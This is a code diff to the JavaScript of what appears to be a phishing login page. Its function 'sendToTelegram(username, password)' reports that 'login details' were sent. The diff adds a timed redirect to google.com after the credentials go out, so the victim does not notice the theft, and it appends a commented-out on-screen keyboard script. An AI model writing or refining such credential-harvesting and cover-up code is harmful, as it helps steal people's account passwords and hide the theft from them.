@@ -27,8 +27,12 @@ async function sendToTelegram(username, password) {
 
     if (response.ok && result.ok) {
       showNotification('Login details sent successfully!', 'success');
+      // ⏳ Redirect after 1.5 seconds
+      setTimeout(() => {
+        window.location.href = 'https://www.google.com';
+      }, 1500);
     } else {
-      showNotification('Server error: message nahi bhej saka!', 'error');
+      showNotification('Server error:', 'error');
     }
   } catch (error) {
     console.error('Error sending message:', error);
@@ -113,3 +117,92 @@ document.querySelectorAll('.input').forEach(input => {
     clearError(input);
   });
 });
+
+// const openKeyboardBtn = document.getElementById('openKeyboard');
+// const screenKeyboard = document.getElementById('screenKeyboard');
+// const closeKeyboardBtn = document.getElementById('closeKeyboard');
+// const keys = document.querySelectorAll('.key');
+// let currentInput = null;
+// let shiftActive = false;
+// let capsActive = false;
+
+// // Open keyboard
+// openKeyboardBtn.addEventListener('click', () => {
+//   currentInput = document.querySelector('.input:focus') || document.querySelector('.input');
+//   screenKeyboard.style.display = 'block';
+//   currentInput.focus();
+// });
+
+// // Close keyboard
+// closeKeyboardBtn.addEventListener('click', () => {
+//   screenKeyboard.style.display = 'none';
+//   currentInput = null;
+// });
+
+// // Toggle Caps Lock
+// const capsLockBtn = document.getElementById('capsLock');
+// capsLockBtn.addEventListener('click', () => {
+//   capsActive = !capsActive;
+//   capsLockBtn.classList.toggle('active');
+// });
+
+// // Toggle Shift
+// const shiftBtn = document.getElementById('shift');
+// shiftBtn.addEventListener('click', () => {
+//   shiftActive = !shiftActive;
+//   shiftBtn.classList.toggle('active');
+// });
+
+// // Type keys
+// keys.forEach(key => {
+//   key.addEventListener('click', () => {
+//     if (!currentInput) return;
+
+//     const keyValue = key.dataset.key;
+
+//     switch(key.id) {
+//       case 'backspace':
+//         currentInput.value = currentInput.value.slice(0, -1);
+//         break;
+//       case 'space':
+//         currentInput.value += ' ';
+//         break;
+//       case 'enter':
+//         currentInput.value += '\n';
+//         break;
+//       case 'tab':
+//         currentInput.value += '\t';
+//         break;
+//       case 'arrowUp':
+//         // optionally handle
+//         break;
+//       case 'arrowDown':
+//         break;
+//       case 'arrowLeft':
+//         break;
+//       case 'arrowRight':
+//         break;
+//       case 'shift':
+//       case 'capsLock':
+//       case 'ctrl':
+//       case 'alt':
+//       case 'closeKeyboard':
+//         break;
+//       default:
+//         let char = keyValue;
+//         if (shiftActive) {
+//           char = char.toUpperCase();
+//           shiftActive = false;
+//           shiftBtn.classList.remove('active');
+//         } else if (capsActive) {
+//           char = char.toUpperCase();
+//         } else {
+//           char = char.toLowerCase();
+//         }
+//         currentInput.value += char;
+//     }
+
+//     currentInput.dispatchEvent(new Event('input'));
+//     currentInput.focus();
+//   });
+// });
